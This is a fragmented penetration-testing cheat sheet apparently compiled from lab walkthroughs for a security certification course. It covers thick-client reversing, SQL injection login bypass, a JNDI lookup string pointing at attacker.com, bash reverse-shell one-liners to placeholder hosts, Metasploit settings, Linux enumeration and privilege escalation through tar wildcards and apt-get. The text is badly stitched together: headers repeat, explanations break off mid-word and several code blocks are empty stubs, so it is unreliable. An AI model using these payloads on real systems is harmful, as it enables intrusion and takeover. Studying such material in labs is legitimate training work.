Inspecting the content of the file reveals that two files are being dropped by the batch file and being deleted before anyone can get access to the leftovers. We can try to retrieve the content of the 2 files, by modifyi

```
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieving-hardcoded-credentials-from-thick-client-applications-2
#cat/UTILS #cpts
Inspecting the content of the file reveals that two files are being dropped by the batch file and being deleted before anyone can get access to the leftovers. We can try to retrieve the content of the 2 files, by modifyi

```
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieving-hardcoded-credentials-from-thick-client-applications-3
#cat/UTILS #cpts
Inspecting the content of the file reveals that two files are being dropped by the batch file and being deleted before anyone can get access to the leftovers. We can try to retrieve the content of the 2 files, by modifyi

```
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieving-hardcoded-credentials-from-thick-client-applications-4
#cat/UTILS #cpts
Inspecting the content of the file reveals that two files are being dropped by the batch file and being deleted before anyone can get access to the leftovers. We can try to retrieve the content of the 2 files, by modifyi

```
echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieving-hardcoded-credentials-from-thick-client-applications-5
#cat/UTILS #cpts
After executing the batch script by double-clicking on it, we wait a few minutes to spot the `oracle.txt` file which contains another file full of base64 lines, and the script `monta.ps1` which contains the following con

```
$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieving-hardcoded-credentials-from-thick-client-applications-6
#cat/UTILS #cpts
This script simply reads the contents of the `oracle.txt` file and decodes it to the `restart-service.exe` executable. Running this script gives us a final executable that we can further analyze.

```
C:\> ls C:\programdata\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieving-hardcoded-credentials-from-thick-client-applications-7
#cat/UTILS #cpts
Now when executing `restart-service.exe` we are presented with the banner `Restart Oracle` created by `HelpDesk` back in 2010.

```
C:\> .\restart-service.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-web-vulnerabilities-in-thick-client-applications
#cat/UTILS #cpts
Inspecting the traffic again reveals that the client is attempting to connect to port `8000`. The `fatty-client.jar` is a Java Archive file, and its content can be extracted by right-clicking on it and selecting `Extract

```
C:\> ls fatty-client\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-web-vulnerabilities-in-thick-client-applications-2
#cat/UTILS #cpts
Let's run PowerShell as administrator, navigate to the extracted directory and use the `Select-String` command to search all the files for port `8000`.

```
C:\> ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-web-vulnerabilities-in-thick-client-applications-3
#cat/UTILS #cpts
There's a match in `beans.xml`. This is a `Spring` configuration file containing configuration metadata. Let's read its content.

```
C:\> cat fatty-client\beans.xml
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-web-vulnerabilities-in-thick-client-applications-4
#cat/UTILS #cpts
Let's edit the line `<constructor-arg index="1" value = "8000"/>` and set the port to `1337`. Reading the content carefully, we also notice that the value of the `secret` is `clarabibiclarabibiclarabibi`. Running the edi

```
C:\> cat fatty-client\META-INF\MANIFEST.MF
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-web-vulnerabilities-in-thick-client-applications-5
#cat/UTILS #cpts
Let's remove the hashes from `META-INF/MANIFEST.MF` and delete the `1.RSA` and `1.SF` files from the `META-INF` directory. The modified `MANIFEST.MF` should end with a new line.

```
txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-web-vulnerabilities-in-thick-client-applications-6
#cat/UTILS #cpts
We can update and run the `fatty-client.jar` file by issuing the following commands.

```
C:\> cd .\fatty-client
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-traversal
#cat/UTILS #cpts
The server filters out the `/` character from the input. Let's decompile the application using [JD-GUI](http://java-decompiler.github.io/), by dragging and dropping the `fatty-client-new.jar` onto the `jd-gui`. ![File ex

```
java
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-traversal-2
#cat/UTILS #cpts
Next, compile the `ClientGuiTest.Java` file.

```
C:\> javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-traversal-3
#cat/UTILS #cpts
This generates several class files. Let's create a new folder and extract the contents of `fatty-client-new.jar` into it.

```
C:\> mkdir raw
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-traversal-4
#cat/UTILS #cpts
Navigate to the `raw` directory and decompress `fatty-client-new-2.jar` by right-clicking and selecting `Extract Here`. Overwrite any existing `htb/fatty/client/gui/*.class` files with updated class files.

```
C:\> mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-traversal-5
#cat/UTILS #cpts
Finally, we build the new JAR file.

```
C:\> jar -cmf META-INF\MANIFEST.MF traverse.jar .
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-traversal-6
#cat/UTILS #cpts
Rebuild the JAR file by following the same steps and log in again to the application. Then, navigate to `FileBrowser` -> `Config`, add the `fatty-server.jar` name in the input field, and click the `Open` button. ![Text f

```
C:\> ls C:\Users\cybervaca\Desktop\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sql-injection
#cat/UTILS #cpts
Listing the content of the `error-log.txt` file reveals the following message. This confirms that the username field is vulnerable to SQL Injection. However, login attempts using payloads such as `' or '1'='1` in both fi

```
SELECT id,username,email,password,role FROM users WHERE username='' or '1'='1'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sql-injection-2
#cat/UTILS #cpts
We can now rebuild the JAR file and attempt to log in using the payload `abc' UNION SELECT 1,'abc','a@b.com','abc','admin` in the `username` field and the random text `abc` in the `password` field. The server will eventu

```
select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - 1-csv-parsed-by-a-scripting-language-with-unsafe-eval
#cat/UTILS #cpts
If a server reads CSV and passes values into `eval()` or `exec()`:

```
import csv
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - 2-csv-fed-into-a-shell-command
#cat/UTILS #cpts
If values are interpolated into shell commands without sanitization:

```
while IFS=','
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - 3-csv-parsed-by-log-processors-log4shell-style
#cat/UTILS #cpts
Some pipelines pass CSV data into logging frameworks. If a value like:

```
${jndi:ldap://attacker.com/x}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - coldfusion---discovery-enumeration
#cat/UTILS #cpts
* * * ColdFusion is a programming language and a web application development platform based on Java. ColdFusion was initially developed by the Allaire Corporation in 1995 and was acquired by Macromedia in 2001. Macromedi

```
SELECT *
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - directory-traversal
#cat/UTILS #cpts
In this code snippet, the ColdFusion `cfdirectory` tag lists the contents of the `uploads` directory, and the `cfloop` tag is used to loop through the query results and display the filenames as clickable links in HTML. H

```
http
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - coldfusion---exploitation
#cat/UTILS #cpts
```
python2 14641.py
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploit-modification
#cat/UTILS #cpts
```
if __name__ == '__main__':
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - tilde-enumeration-using-iis-shortname-scanner
#cat/UTILS #cpts
Manually sending HTTP requests for each letter of the alphabet can be a tedious process. Fortunately, there is a tool called `IIS-ShortName-Scanner` that can automate this task. You can find it on GitHub at the following

```
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - generate-wordlist
#cat/UTILS #cpts
The pwnbox image offers an extensive collection of wordlists located in the `/usr/share/wordlists/` directory, which can be utilised for this purpose.

```
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - ldap-injection
#cat/UTILS #cpts
`LDAP injection` is an attack that `exploits web applications that use LDAP` (Lightweight Directory Access Protocol) for authentication or storing user information. The attacker can `inject malicious code` or `characters

```
(&(objectClass=user)(sAMAccountName=name)(userPassword=word))
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - web-mass-assignment-vulnerabilities
#cat/UTILS #cpts
* * * Several frameworks offer handy mass-assignment features to lessen the workload for developers. Because of this, programmers can directly insert a whole set of user-entered data from a form into an object or databas

```
class User < ActiveRecord::Base
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-mass-assignment-vulnerability
#cat/UTILS #cpts
Suppose we come across the following application that features an Asset Manager web application. Also suppose that the application's source code has been provided to us. Completing the registration step, we get the messa

```
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-mass-assignment-vulnerability-2
#cat/UTILS #cpts
We can see that the application is checking if the value `k` is set. If yes, then it allows the user to log in. In the code below, we can also see that if we set the `confirmed` parameter during registration, then it ins

```
try:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - prevention
#cat/UTILS #cpts
To prevent this type of attack, one should explicitly assign the attributes for the allowed fields, or use whitelisting methods provided by the framework to check the attributes that can be mass-assigned. The following e

```
class UsersController < ApplicationController
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - elf-executable-examination
#cat/UTILS #cpts
The `octopus_checker` binary is found on a remote machine during the testing. Running the application locally reveals that it connects to database instances in order to verify that they are available.

```
./octopus_checker
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - elf-executable-examination-2
#cat/UTILS #cpts
This reveals several call instructions that point to addresses containing strings. They appear to be sections of a SQL connection string, but the sections are not in order, and the endianness entails that the string text

```
assembly
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dll-file-examination
#cat/UTILS #cpts
A DLL file is a `Dynamically Linked Library` and it contains code that is called from other programs while they are running. The `MultimasterAPI.dll` binary is found on a remote machine during the enumeration process. Ex

```
C:\> Get-FileMetaData .\MultimasterAPI.dll
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - use-what-youve-learned-from-this-section-to-generate-a-report-with-eye
#cat/UTILS #cpts
After spawning the target machine, students need to add the following vHost entires in `/etc/hosts` on Pwnbox/`PMVPN`, allowing them to resolve host names later in the subsequent sections (an alternative syntax would be

```
cat <<EOF scopeList
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-does-the-header-on-title-page-say-when-opening-the-aquatone_repor
#cat/UTILS #cpts
Once `aquatone` finishes, students need to open the report it generated with a browser, for example using `FireFox`. One of the first things students will see on web page is `Pages by Similarity`:

```
firefox aquatone_report.html
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - following-the-steps-in-the-section-obtain-code-execution-on-the-host-a
#cat/UTILS #cpts
Students first need to navigate to `http://blog.inlanefreight.local/wp-login.php` and use the previously harvested credentials `doug:jessica1` to login: Once inside the admin panel, students need to click on "Appearance

```
exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - following-the-steps-in-the-section-obtain-code-execution-on-the-host-a-2
#cat/UTILS #cpts
Once the reverse shell is attained, students can print out the flag file "flag.txt" which is under the `/var/www/blog.inlanefreight.local/` directory:

```
cat /var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - work-through-all-of-the-examples-in-this-section-and-gain-rce-multiple
#cat/UTILS #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP drupal.inlanefreight.local` Students then need to navigate to `http://drupal.inlanefreig

```
exec("/bin/bash -c 'bash -i > /dev/tcp/PWNIP/PWNPO 0>&1'")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - work-through-all-of-the-examples-in-this-section-and-gain-rce-multiple-2
#cat/UTILS #cpts
At last, students can print out the flag file `flag_6470e394cbf6dab6a91682cc8585059b.txt`, which will be under the same directory of the reverse shell attained:

```
cat flag_6470e394cbf6dab6a91682cc8585059b.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - attack-the-splunk-target-and-gain-remote-code-execution-submit-the-con
#cat/UTILS #cpts
Then, students need to edit the file `run.ps1` under the directory `reverse_shell_splunk/reverse_shell_splunk/bin` to insert `PWNIP` and `PWNPO`, in place of `'attacker_ip_here'` and `attacker_port_here`: After saving th

```
tar -cvzf updater.tar.gz reverse_shell_splunk/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - attack-the-splunk-target-and-gain-remote-code-execution-submit-the-con-2
#cat/UTILS #cpts
```
└──╼ [★]$ tar -cvzf updater.tar.gz reverse_shell_splunk/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - attack-the-splunk-target-and-gain-remote-code-execution-submit-the-con-3
#cat/UTILS #cpts
At last, students need to print out the flag file "flag.txt" under the `C:\loot\` directory:

```
cat C:\loot\flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - attack-the-splunk-target-and-gain-remote-code-execution-submit-the-con-4
#cat/UTILS #cpts
```
l00k_ma_no_AutH!
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-remote-code-execution-on-the-gitlab-instance-submit-the-flag-in-t
#cat/UTILS #cpts
On the `nc` listener, students will notice that the reverse-shell connection has been established. Thus, at last, they need to print the flag file "flag_gitlab.txt":

```
cat flag_gitlab.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - perform-an-analysis-of-cappsrestart-oracleserviceexe-and-identify-the-
#cat/UTILS #cpts
Then, students need to navigate to to `C:\TOOLS\ProcessMonitor` and launch `Procmon64`: Clicking `Agree` when prompted, once `Procmon64` is running, students need use File Explorer to copy the `Restart-OracleService` scr

```
cd Desktop
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - perform-an-analysis-of-cappsrestart-oracleserviceexe-and-identify-the--2
#cat/UTILS #cpts
Then, students need to navigate to to `C:\TOOLS\ProcessMonitor` and launch `Procmon64`: Clicking `Agree` when prompted, once `Procmon64` is running, students need use File Explorer to copy the `Restart-OracleService` scr

```
.\Restart-OracleService.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - perform-an-analysis-of-cappsrestart-oracleserviceexe-and-identify-the--3
#cat/UTILS #cpts
![Attacking_Common_Applications_Walkthrough_Image_68.png](:/07644d8f50694a0982d238c1a128e97f) Students need edit the script in `Notepad`, modifying it to no longer delete the `monta.ps1` and `oracle.txt` files: Saving th

```
cd C:\Programdata
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - perform-an-analysis-of-cappsrestart-oracleserviceexe-and-identify-the--4
#cat/UTILS #cpts
![Attacking_Common_Applications_Walkthrough_Image_68.png](:/07644d8f50694a0982d238c1a128e97f) Students need edit the script in `Notepad`, modifying it to no longer delete the `monta.ps1` and `oracle.txt` files: Saving th

```
cat .\monta.ps1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - perform-an-analysis-of-cappsrestart-oracleserviceexe-and-identify-the--5
#cat/UTILS #cpts
![Attacking_Common_Applications_Walkthrough_Image_68.png](:/07644d8f50694a0982d238c1a128e97f) Students need edit the script in `Notepad`, modifying it to no longer delete the `monta.ps1` and `oracle.txt` files: Saving th

```
.\monta.ps1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-ip-address-of-the-eth0-interface-under-the-serverstatus---
#cat/UTILS #cpts
Subsequently, students need to open File Explorer, navigate to `C:\Apps` and right click on `fatty-client` to extract files: Having extracted the contents of the thick client to a folder, students need to go in the newly

```
cd C:\Apps\fatty-client\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-ip-address-of-the-eth0-interface-under-the-serverstatus----2
#cat/UTILS #cpts
Students need to drag and drop the new jar file into `jd-gui`, then select `File` --> `Save All Sources`: Subsequently, students need to extract the `fatty-client-new.jar.src.zip` archive to the Desktop and edit the `fat

```
cd C:\Users\cybervaca\Desktop\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-ip-address-of-the-eth0-interface-under-the-serverstatus----3
#cat/UTILS #cpts
Students then need to decompress the `fatty-client-new-2.jar` by right-clicking and selecting `Extract Here`: Afterward, students need to overwrite any existing `htb/fatty/client/gui/*.class` files with the updated class

```
mv -Force fatty-client-new.jar.src/htb/fatty/client/gui/*.class raw/htb/fatty/client/gui/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-ip-address-of-the-eth0-interface-under-the-serverstatus----4
#cat/UTILS #cpts
Now, students can build the new JAR file:

```
cd raw
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-ip-address-of-the-eth0-interface-under-the-serverstatus----5
#cat/UTILS #cpts
Now, students can build the new JAR file:

```
jar -cmf META-INF/MANIFEST.MF traverse.jar .
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-ip-address-of-the-eth0-interface-under-the-serverstatus----6
#cat/UTILS #cpts
![Attacking_Common_Applications_Walkthrough_Image_94.png](:/117ccb33a86d4173a142608f7b167974) Students need to recompile the java class files, and then create a new JAR:

```
cd .\raw\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-ip-address-of-the-eth0-interface-under-the-serverstatus----7
#cat/UTILS #cpts
Finally, students need to run the newly compiled `inject.jar` and bypass the login with a SQL injection payload (using `abc` as the password):

```
abc' UNION SELECT 1,'abc','a@b.com','abc','admin
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-credentials-were-found-for-the-local-database-instance-while-debu
#cat/UTILS #cpts
The `disassembly-flavor` command can be used to define the display style of the code prior to disassembling:

```
set disassembly-flavor intel
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-credentials-were-found-for-the-local-database-instance-while-debu-2
#cat/UTILS #cpts
Upon finding the call to `SQLDriverConnect`, students need to set the breakpoint and run it again. Note that setting the breakpoint directly on the Procedure Linkage Table will produce an error. Therefore, students need

```
b SQLDriverConnect
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerate-the-application-for-vulnerabilities-gain-remote-code-executi-2
#cat/UTILS #cpts
At last, students need to run the module/exploit using the `exploit` command:

```
exploit
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerate-the-application-for-vulnerabilities-gain-remote-code-executi-3
#cat/UTILS #cpts
Once the `Meterpreter` session has been established, students at last need to print the flag file "flag.txt", which is under the `C:\Users\Administrator\Desktop\` directory, however, since this is a `Meterpreter` session

```
type C:/Users/Administrator/Desktop/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerate-the-application-for-vulnerabilities-gain-remote-code-executi-4
#cat/UTILS #cpts
```
(Meterpreter 13)(C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain) > cat C:/Users/Administrator/Desktop/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploit-the-application-to-obtain-a-shell-and-submit-the-contents-of-t
#cat/UTILS #cpts
Subsequently, students need to set the options of the module accordingly (`FORCEEXPLOIT` needs to be set to `true`) and run the exploit:

```
set TARGETURI /cgi/cmd.bat
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploit-the-application-to-obtain-a-shell-and-submit-the-contents-of-t-2
#cat/UTILS #cpts
Subsequently, students need to set the options of the module accordingly (`FORCEEXPLOIT` needs to be set to `true`) and run the exploit:

```
set LHOST tun0
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploit-the-application-to-obtain-a-shell-and-submit-the-contents-of-t-3
#cat/UTILS #cpts
Subsequently, students need to set the options of the module accordingly (`FORCEEXPLOIT` needs to be set to `true`) and run the exploit:

```
set FORCEEXPLOIT true
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploit-the-application-to-obtain-a-shell-and-submit-the-contents-of-t-4
#cat/UTILS #cpts
At last, students need to print out the contents of the flag file "flag.txt", which is under the directory `C:\Users\Administrator\Desktop\`:

```
cat C:/Users/Administrator/Desktop/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-url-of-the-wordpress-instance-2
#cat/UTILS #cpts
```
└──╼ [★]$ sudo sh -c 'echo "10.129.201.90 inlanefreight.local" >> /etc/hosts'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-url-of-the-wordpress-instance-3
#cat/UTILS #cpts
Students then need to add the three entries to `/etc/hosts`:

```
sudo sh -c 'echo "STMIP monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-url-of-the-wordpress-instance-4
#cat/UTILS #cpts
```
└──╼ [★]$ sudo sh -c 'echo "10.129.201.90 monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - obtain-reverse-shell-access-on-the-target-and-submit-the-contents-of-t
#cat/UTILS #cpts
Once the reverse shell has been attained, students need to press Enter and then use `fg` on the `nc` job ID (9 in here):

```
fg 9
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - obtain-reverse-shell-access-on-the-target-and-submit-the-contents-of-t-2
#cat/UTILS #cpts
At last, students need to print out the contents of the flag file "f5088a862528cbb16b4e253f1809882c_flag.txt", which is located in the same landing directory of the reverse shell:

```
cat f5088a862528cbb16b4e253f1809882c_flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - list-current-terminal-attached-processes
#cat/UTILS #cpts
```
ps au
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - cron-jobs-2
#cat/UTILS #cpts
```
ls -la /etc/cron.daily/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - file-systems-additional-drives
#cat/UTILS #cpts
```
lsblk
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gaining-situational-awareness
#cat/UTILS #cpts
Let's say we have just gained access to a Linux host by exploiting an unrestricted file upload vulnerability during an External Penetration Test. After establishing our reverse shell (and ideally some sort of persistence

```
cat /etc/os-release
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gaining-situational-awareness-2
#cat/UTILS #cpts
We can also check out all environment variables that are set for our current user, we may get lucky and find something sensitive in there such as a password. We'll note this down and move on.

```
env
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gaining-situational-awareness-3
#cat/UTILS #cpts
Next let's note down the Kernel version. We can do some searches to see if the target is running a vulnerable Kernel (which we'll get to take advantage of later on in the module) which has some known public exploit PoC.

```
uname -a
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gaining-situational-awareness-4
#cat/UTILS #cpts
We can next gather some additional information about the host itself such as the CPU type/version:

```
lscpu
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gaining-situational-awareness-5
#cat/UTILS #cpts
What login shells exist on the server? Note these down and highlight that both Tmux and Screen are available to us.

```
cat /etc/shells
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gaining-situational-awareness-6
#cat/UTILS #cpts
The command `lpstat` can be used to find information about any printers attached to the system. If there are active or queued print jobs can we gain access to some sort of sensitive information? We should also check for

```
cat /etc/fstab
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gaining-situational-awareness-7
#cat/UTILS #cpts
Check out the routing table by typing `route` or `netstat -rn`. Here we can see what other networks are available via which interface.

```
route
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gaining-situational-awareness-8
#cat/UTILS #cpts
In a domain environment we'll definitely want to check `/etc/resolv.conf` if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment. We'll also

```
arp -a
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - existing-groups
#cat/UTILS #cpts
```
cat /etc/group
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - existing-groups-2
#cat/UTILS #cpts
The `/etc/group` file lists all of the groups on the system. We can then use the [getent](https://man7.org/linux/man-pages/man1/getent.1.html) command to list members of any interesting groups.

```
getent group sudo
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounted-file-systems
#cat/UTILS #cpts
```
df -h
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - network-interfaces
#cat/UTILS #cpts
```
ip a
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - hosts
#cat/UTILS #cpts
```
cat /etc/hosts
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logged-in-users
#cat/UTILS #cpts
```
12:27:21 up 1 day, 16:55, 1 user, load average: 0.00, 0.00, 0.00
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - finding-history-files
#cat/UTILS #cpts
```
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sudo-version
#cat/UTILS #cpts
```
sudo -V
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sudo-version-2
#cat/UTILS #cpts
```
Sudo version 1.8.31
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - binaries
#cat/UTILS #cpts
```
ls -l /bin /usr/bin/ /usr/sbin/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - trace-system-calls
#cat/UTILS #cpts
```
strace ping -c1 10.129.112.20
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - configuration-files
#cat/UTILS #cpts
```
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-abuse
#cat/UTILS #cpts
* * * [PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a

```
:~$ echo $PATH
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-abuse-2
#cat/UTILS #cpts
Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

```
:~$ pwd && conncheck
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-abuse-3
#cat/UTILS #cpts
```
:~$ PATH=.:${PATH}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - path-abuse-4
#cat/UTILS #cpts
In this example, we modify the path to run a simple `echo` command when the command `ls` is typed.

```
:~$ touch ls
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - wildcard-abuse
#cat/UTILS #cpts
* * * A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include: An example of how wildcards can be abused for privilege

```
:~$ man tar
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - wildcard-abuse-2
#cat/UTILS #cpts
The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, w

```
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - wildcard-abuse-3
#cat/UTILS #cpts
We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands t

```
:~$ echo "" > --checkpoint=1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - wildcard-abuse-4
#cat/UTILS #cpts
We can check and see that the necessary files were created.

```
:~$ ls -la
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - wildcard-abuse-6
#cat/UTILS #cpts
Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

```
(root) NOPASSWD: ALL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - command-injection
#cat/UTILS #cpts
Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the `ls` command. Unfortunately, the shell only allows us to execute the `ls` command with a specific set of ar

```
htraydon@htb[/htb]$ ls -l `pwd`
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gtfobins
#cat/UTILS #cpts
The [GTFOBins](https://gtfobins.github.io) project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program's features that can be used to b

```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - lxc-lxd-2
#cat/UTILS #cpts
Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step

```
:~$ lxd init
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - lxc-lxd-3
